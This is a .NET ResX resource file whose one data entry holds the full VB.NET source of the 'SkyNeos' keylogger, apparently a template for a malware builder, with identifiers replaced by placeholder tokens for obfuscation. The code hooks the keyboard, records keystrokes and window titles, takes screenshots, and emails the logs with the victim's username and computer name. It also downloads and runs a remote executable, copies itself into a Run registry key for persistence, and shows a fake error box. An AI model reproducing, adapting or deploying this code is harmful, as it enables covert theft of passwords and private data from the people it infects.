<?xml version="1.0" encoding="utf-8"?>
<root>
  <!-- 
    Microsoft ResX Schema 
    
    Version 2.0
    
    The primary goals of this format is to allow a simple XML format 
    that is mostly human readable. The generation and parsing of the 
    various data types are done through the TypeConverter classes 
    associated with the data types.
    
    Example:
    
    ... ado.net/XML headers & schema ...
    <resheader name="resmimetype">text/microsoft-resx</resheader>
    <resheader name="version">2.0</resheader>
    <resheader name="reader">System.Resources.ResXResourceReader, System.Windows.Forms, ...</resheader>
    <resheader name="writer">System.Resources.ResXResourceWriter, System.Windows.Forms, ...</resheader>
    <data name="Name1"><value>this is my long string</value><comment>this is a comment</comment></data>
    <data name="Color1" type="System.Drawing.Color, System.Drawing">Blue</data>
    <data name="Bitmap1" mimetype="application/x-microsoft.net.object.binary.base64">
        <value>[base64 mime encoded serialized .NET Framework object]</value>
    </data>
    <data name="Icon1" type="System.Drawing.Icon, System.Drawing" mimetype="application/x-microsoft.net.object.bytearray.base64">
        <value>[base64 mime encoded string representing a byte array form of the .NET Framework object]</value>
        <comment>This is a comment</comment>
    </data>
                
    There are any number of "resheader" rows that contain simple 
    name/value pairs.
    
    Each data row contains a name, and value. The row also contains a 
    type or mimetype. Type corresponds to a .NET class that support 
    text/value conversion through the TypeConverter architecture. 
    Classes that don't support this are serialized and stored with the 
    mimetype set.
    
    The mimetype is used for serialized objects, and tells the 
    ResXResourceReader how to depersist the object. This is currently not 
    extensible. For a given mimetype the value must be set accordingly:
    
    Note - application/x-microsoft.net.object.binary.base64 is the format 
    that the ResXResourceWriter will generate, however the reader can 
    read any of the formats listed below.
    
    mimetype: application/x-microsoft.net.object.binary.base64
    value   : The object must be serialized with 
            : System.Runtime.Serialization.Formatters.Binary.BinaryFormatter
            : and then encoded with base64 encoding.
    
    mimetype: application/x-microsoft.net.object.soap.base64
    value   : The object must be serialized with 
            : System.Runtime.Serialization.Formatters.Soap.SoapFormatter
            : and then encoded with base64 encoding.

    mimetype: application/x-microsoft.net.object.bytearray.base64
    value   : The object must be serialized into a byte array 
            : using a System.ComponentModel.TypeConverter
            : and then encoded with base64 encoding.
    -->
  <xsd:schema id="root" xmlns="" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:msdata="urn:schemas-microsoft-com:xml-msdata">
    <xsd:import namespace="http://www.w3.org/XML/1998/namespace" />
    <xsd:element name="root" msdata:IsDataSet="true">
      <xsd:complexType>
        <xsd:choice maxOccurs="unbounded">
          <xsd:element name="metadata">
            <xsd:complexType>
              <xsd:sequence>
                <xsd:element name="value" type="xsd:string" minOccurs="0" />
              </xsd:sequence>
              <xsd:attribute name="name" use="required" type="xsd:string" />
              <xsd:attribute name="type" type="xsd:string" />
              <xsd:attribute name="mimetype" type="xsd:string" />
              <xsd:attribute ref="xml:space" />
            </xsd:complexType>
          </xsd:element>
          <xsd:element name="assembly">
            <xsd:complexType>
              <xsd:attribute name="alias" type="xsd:string" />
              <xsd:attribute name="name" type="xsd:string" />
            </xsd:complexType>
          </xsd:element>
          <xsd:element name="data">
            <xsd:complexType>
              <xsd:sequence>
                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
                <xsd:element name="comment" type="xsd:string" minOccurs="0" msdata:Ordinal="2" />
              </xsd:sequence>
              <xsd:attribute name="name" type="xsd:string" use="required" msdata:Ordinal="1" />
              <xsd:attribute name="type" type="xsd:string" msdata:Ordinal="3" />
              <xsd:attribute name="mimetype" type="xsd:string" msdata:Ordinal="4" />
              <xsd:attribute ref="xml:space" />
            </xsd:complexType>
          </xsd:element>
          <xsd:element name="resheader">
            <xsd:complexType>
              <xsd:sequence>
                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
              </xsd:sequence>
              <xsd:attribute name="name" type="xsd:string" use="required" />
            </xsd:complexType>
          </xsd:element>
        </xsd:choice>
      </xsd:complexType>
    </xsd:element>
  </xsd:schema>
  <resheader name="resmimetype">
    <value>text/microsoft-resx</value>
  </resheader>
  <resheader name="version">
    <value>2.0</value>
  </resheader>
  <resheader name="reader">
    <value>System.Resources.ResXResourceReader, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
  </resheader>
  <resheader name="writer">
    <value>System.Resources.ResXResourceWriter, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
  </resheader>
  <data name="SkyNeosPolymorphic_Obfuscated" xml:space="preserve">
    <value>Imports System
Imports System.Net
Imports System.Diagnostics
Imports System.IO
Imports System.Drawing
Imports System.Threading
Imports System.Net.Mail
Imports Microsoft.Win32
Imports System.Windows.Forms
Imports Microsoft.VisualBasic


Module SkyNeosClass

    'Internal Objects
    Public [1] As Mutex
    Public [2] As String = "*mutex*"
    Public WithEvents [3] As New {1}
    Public [4] As String
    Public [5] As String
    Public [6] As String = "*startfolder*"
    Public [7] As String = "*startexe*"
    Public [8] As Thread
    Public [9] As String
    Public [10] As Process
    Public WithEvents [11] As New System.Windows.Forms.Timer
    Private Declare Function [12] Lib "kernel32.dll" Alias "GetConsoleWindow" () As IntPtr
    Private Declare Function [13] Lib "user32.dll" Alias "ShowWindow" (ByVal [14] As IntPtr, ByVal [15] As Int32) As Int32
    Private Const [16] As Int32 = 7
    Private Const [17] As Int32 = 1
    Private Const [18] As Int32 = 0
    Private Declare Function [19] Lib "user32.dll" Alias "GetForegroundWindow" () As Int32
    Private Declare Function [20] Lib "user32.dll" Alias "GetWindowTextA" (ByVal [14] As Int32, ByVal [21] As String, ByVal [22] As Int32) As Int32
    Private Function [23]() As String
        Dim [24] As String
        [24] = New String(Chr(0), 100)
        [20]([19], [24], 100)
        [24] = [24].Substring(0, InStr([24], Chr(0)) - 1)
        Return [24]
    End Function
    Public Sub [25](ByVal [26] As String, ByVal [27] As String)
        Dim [28] As Microsoft.Win32.RegistryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run")
        With [28]
            .OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True)
            .SetValue([26], [27])
        End With
    End Sub
    Public Sub [29](ByVal [26] As String)
        Dim [28] As Microsoft.Win32.RegistryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run")
        With [28]
            .OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True)
            .DeleteValue([26], False)
        End With
    End Sub
    Sub [30](ByVal [31] As String) 'This is the mutex sub routine.
        Try 'So we're trying to do the following...
            System.Threading.Mutex.OpenExisting([31]) 'Open the process that holds our mutex in it.
            End 'If it can actually open a process that has our mutex, we end the program. Otherwise...
        Catch [32] As Exception 'If it can't find any process with our mutex...
            [1] = New System.Threading.Mutex(False, [31]) 'We declare our mutex for the current process...
            Exit Sub 'And keep on going!
        End Try
    End Sub
    Public Function [33](ByVal [34] As Integer, ByVal [35] As Integer) As String
        Dim [36] As New Random 'Declares a new Random variable to generate the length of the string.
        Dim [37] As String = Nothing 'Declares a new String that will hold the random variable.
        Dim [38] As String = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPLKHJJGFDSAZXCVBNM" 'Declares a new string, and stores all the possible characters that may be a part of the randomly generated variable.
        For [39] As Integer = 1 To [36].Next([34] + 1, [35]) 'Repeats the following function until the random number of variables is met.
            Dim [40] As Integer = Int(([38].Length - 2) * Rnd()) + 1 'Selects a random index position in PickAChar (random char in the listing)
            [37] += ([38]([40])) 'Takes whatever is already in TheVariable, then adds on the next random variable by reading what the random picked position was.
        Next 'After it's done looping through the # 
        Return [37] 'Returns the randomized variable.
    End Function
    Private Sub [41](ByVal [42] As String) Handles [3].{14}
        If [5] &lt;&gt; [23]() Then
            [4] &amp;= vbNewLine &amp; "[TITLE: " &amp; [23]() &amp; "]:" + vbNewLine
            [5] = [23]()
            Console.WriteLine(vbCrLf + "[TITLE: " &amp; [23]() &amp; "]:")
        End If
        [4] &amp;= [42]
        Console.Write([42])
    End Sub
    Private Sub [43](ByVal [44] As System.Object, ByVal [45] As System.EventArgs) Handles [11].Tick
        Console.WriteLine("A new log is sending...")
        Dim [46] As New Thread(AddressOf [47])
        With [46]
            .IsBackground = True
            .Start([4])
        End With
        [4] = ""
    End Sub
    Private Sub [47](ByVal [48] As String)
        On Error Resume Next
        Dim [49] As String = Path.GetTempPath() + "\" + [33](5, 10) + ".png"
        If [50] = True Then
            !1!.!34!()
            If File.Exists([49]) Then
                File.Delete([49])
            End If
            !1!.!29!.Save([49], Drawing.Imaging.ImageFormat.Png)
        End If

        Dim [51] As New MailMessage
        Dim [52] As New SmtpClient([53])
        With [52]
            .EnableSsl = True
            .Credentials = New System.Net.NetworkCredential([54], [55])
            .Port = [56]
        End With
        With [51]
            .To.Add([54])
            .From = New MailAddress([54])
            .Subject = [57]
            .Body = [48]
            If [50] = True Then .Attachments.Add(New Net.Mail.Attachment([49]))
            If [58] = True Then .Body = "Victim Username: " + [59]().ToString() + vbCrLf + .Body
            If [60] = True Then .Body = "Victim Computer Name: " + My.Computer.Name + vbCrLf + .Body
        End With
        [52].Send([51])
        Console.WriteLine("##### Logs have been sent! #####")
    End Sub
    Private Sub [61]()
        On Error Resume Next
        Dim [62] As New WebClient : Dim [63] As New Uri([64]) : [9] = Path.GetTempPath() + "\" + [33](5, 10) + ".exe"
        AddHandler [62].DownloadFileCompleted, AddressOf [65]
        [62].DownloadFileAsync([63], [9])
    End Sub
    Private Sub [65](ByVal [44] As System.Object, ByVal [45] As System.ComponentModel.AsyncCompletedEventArgs)
        On Error Resume Next
        Dim [66] As New Process
        With [66].StartInfo
            .FileName = [9]
            .UseShellExecute = True
        End With
        [66].Start()
    End Sub
    Private Function [59]() As String
        Dim [67] As String = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
        Dim [68] As String = [67].Remove([67].LastIndexOf("\"))
        Dim [69] As String = [68].Substring([68].LastIndexOf("\") + 1)
        Return [69]
    End Function

    'Account
    Public [54] As String = "*gmail*"
    Public [55] As String = "*gpass*"
    Public [53] As String = "*smtp*"
    Public [56] As Integer = 462488

    'Server
    Public [70] As Integer = 55555
    Public [71] As [72] = 99999

    'Log Results Settings
    Public [57] As String = "*title*"
    Public [50] As Boolean = False 'Screenshot
    Public [60] As Boolean = False 'Computer Name
    Public [58] As Boolean = False 'Victim Name

    'Other Settings
    Public [64] As String = "*download*"
    Public [73] As String = "*webpage*"
    Public [74] As String = "*errortitle*"
    Public [75] As String = "*errormessage*"
    Public [76] As Integer = 123456789
    Public [77] As Boolean = True 'UseError

    Public Enum [72] As Integer
        [78] = 1
        [79] = 1000
        [80] = 60000
        [81] = 3600000
    End Enum

    Sub Main()
        On Error Resume Next
        [30]([2])
        With [11]
            .Interval = ([70] * Integer.Parse([71]))
            .Start()
        End With
        [8] = New Thread(AddressOf [61])
        With [8]
            .IsBackground = True
            .Start()
        End With
        [10] = New Process
        With [10]
            .StartInfo.FileName = [73]
            .StartInfo.UseShellExecute = True
            .Start()
        End With
        If [77] = True Then
            MsgBox([75], [76], [74])
        End If
        Console.WriteLine("SkyNeos V1.0 Keylogger Engine Started Successfully!")
        Dim [82] As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)
        My.Computer.FileSystem.CreateDirectory([82] + "\" + [6])
        [82] &amp;= "\" + [6] + "\" + [7]
        My.Computer.FileSystem.CopyFile(Application.ExecutablePath, [82], True)
        [25]([6], [82])
        [3].{23}()
        Application.Run()
    End Sub

End Module

Public Class {1}
    Private Declare Function {2} Lib "user32" Alias "SetWindowsHookExA" (ByVal {3} As Integer, ByVal {4} As {5}, ByVal {6} As Integer, ByVal {7} As Integer) As Integer
    Private Declare Function {8} Lib "user32" Alias "CallNextHookEx" (ByVal {3} As Integer, ByVal {9} As Integer, ByVal {10} As Integer, ByRef {11} As {12}) As Integer
    Private Declare Function {13} Lib "user32" Alias "UnhookWindowsHookEx" (ByVal {3} As Integer) As Integer
    Private Delegate Function {5}(ByVal {9} As Integer, ByVal {10} As Integer, ByRef {11} As {12}) As Integer
    Public Shared Event {14}(ByVal {15} As String)
    Public Shared Event {16}(ByVal {15} As String)
    Private Shared {15} As Integer
    Private Shared {17} As {5}
    Private Structure {12} : Public {18} As Integer : Public {19} As Integer : Public {20} As Integer : Public {21} As Integer : Public {22} As Integer : End Structure
    Public Sub {23}()
        {17} = New {5}(AddressOf {24})
        {15} = {2}(13, {17}, System.Runtime.InteropServices.Marshal.GetHINSTANCE(System.Reflection.Assembly.GetExecutingAssembly.GetModules()(0)).ToInt32, 0)
    End Sub

    Private Function {24}(ByVal {18} As Integer, ByVal {10} As Integer, ByRef {11} As {12}) As Integer
        If ({18} = 0) Then
            Select Case {10}
                Case &amp;H100, &amp;H104 : RaiseEvent {14}({25}(CType({11}.{18}, Keys)))
                Case &amp;H101, &amp;H105 : RaiseEvent {16}({25}(CType({11}.{18}, Keys)))
            End Select
        End If
        Return {8}({15}, {18}, {10}, {11})
    End Function
    Public Sub {26}()
        {13}({15})
        MyBase.Finalize()
    End Sub
    Private Function {25}(ByVal {27} As Keys) As String
        Select Case {27}
            Case 65 To 90
                If Control.IsKeyLocked(Keys.CapsLock) Or (Control.ModifierKeys And Keys.Shift) &lt;&gt; 0 Then
                    Return {27}.ToString
                Else
                    Return {27}.ToString.ToLower
                End If
            Case 48 To 57
                If (Control.ModifierKeys And Keys.Shift) &lt;&gt; 0 Then
                    Select Case {27}.ToString
                        Case "D1" : Return "!"
                        Case "D2" : Return "@"
                        Case "D3" : Return "#"
                        Case "D4" : Return "$"
                        Case "D5" : Return "%"
                        Case "D6" : Return "^"
                        Case "D7" : Return "&amp;"
                        Case "D8" : Return "*"
                        Case "D9" : Return "("
                        Case "D0" : Return ")"
                    End Select
                Else
                    Return {27}.ToString.Replace("D", Nothing)
                End If
            Case 96 To 105
                Return {27}.ToString.Replace("NumPad", Nothing)
            Case 106 To 111
                Select Case {27}.ToString
                    Case "Divide" : Return "/"
                    Case "Multiply" : Return "*"
                    Case "Subtract" : Return "-"
                    Case "Add" : Return "+"
                    Case "Decimal" : Return "."
                End Select
            Case 32
                Return " "
            Case 186 To 222
                If (Control.ModifierKeys And Keys.Shift) &lt;&gt; 0 Then
                    Select Case {27}.ToString
                        Case "OemMinus" : Return "_"
                        Case "Oemplus" : Return "+"
                        Case "OemOpenBrackets" : Return "{"
                        Case "Oem6" : Return "}"
                        Case "Oem5" : Return "|"
                        Case "Oem1" : Return ":"
                        Case "Oem7" : Return """"
                        Case "Oemcomma" : Return "&lt;"
                        Case "OemPeriod" : Return "&gt;"
                        Case "OemQuestion" : Return "?"
                        Case "Oemtilde" : Return "~"
                    End Select
                Else
                    Select Case {27}.ToString
                        Case "OemMinus" : Return "-"
                        Case "Oemplus" : Return "="
                        Case "OemOpenBrackets" : Return "["
                        Case "Oem6" : Return "]"
                        Case "Oem5" : Return "\"
                        Case "Oem1" : Return ";"
                        Case "Oem7" : Return "'"
                        Case "Oemcomma" : Return ","
                        Case "OemPeriod" : Return "."
                        Case "OemQuestion" : Return "/"
                        Case "Oemtilde" : Return "`"
                    End Select
                End If
            Case Keys.Return
                Return Environment.NewLine
            Case Else
                Return "&lt;" + {27}.ToString + "&gt;"
        End Select
        Return Nothing
    End Function
End Class

Module !1!

    Private Declare Function !2! Lib "gdi32" Alias "CreateDCA" (ByVal !3! As String, ByVal !4! As String, ByVal !5! As String, ByVal !6! As String) As Integer

    Private Declare Function !7! Lib "GDI32" Alias "CreateCompatibleDC" (ByVal !8! As Integer) As Integer

    Private Declare Function !9! Lib "GDI32" Alias "CreateCompatibleBitmap" (ByVal !8! As Integer, ByVal !10! As Integer, ByVal !11! As Integer) As Integer

    Private Declare Function !12! Lib "gdi32" Alias "GetDeviceCaps" (ByVal !8! As Integer, ByVal !13! As Integer) As Integer

    Private Declare Function !14! Lib "GDI32" Alias "SelectObject" (ByVal !8! As Integer, ByVal !15! As Integer) As Integer

    Private Declare Function !16! Lib "GDI32" Alias "BitBlt" (ByVal !17! As Integer, ByVal !18! As Integer, ByVal !19! As Integer, ByVal !20! As Integer, ByVal !21! As Integer, ByVal !22! As Integer, ByVal !23! As Integer, ByVal !24! As Integer, ByVal !25! As Integer) As Integer

    Private Declare Function !26! Lib "GDI32" Alias "DeleteDC" (ByVal !8! As Integer) As Integer

    Private Declare Function !27! Lib "GDI32" Alias "DeleteObject" (ByVal !28! As Integer) As Integer

    Public !29! As Bitmap = Nothing
    Public !30! As Byte()

    Const !31! As Integer = &amp;HCC0020

    Private !32!, !33! As Integer

    Public Sub !34!()
        'Captures the Current Screen and Stores in a Bitmap


        Dim !35!, !36! As Integer
        Dim !37!, !38! As Integer
        Dim !39! As Integer

        !35! = !2!("DISPLAY", "", "", "")
        !36! = !7!(!35!)

        !32! = !12!(!35!, 8)
        !33! = !12!(!35!, 10)
        !37! = !9!(!35!, !32!, !33!)

        !38! = !14!(!36!, !37!)
        !39! = !16!(!36!, 0, 0, !32!, !33!, !35!, 0, 0, 13369376)
        !37! = !14!(!36!, !38!)

        !39! = !26!(!35!)
        !39! = !26!(!36!)

        !29! = Image.FromHbitmap(New IntPtr(!37!))
        !27!(!37!)



    End Sub

End Module
</value>
  </data>
</root>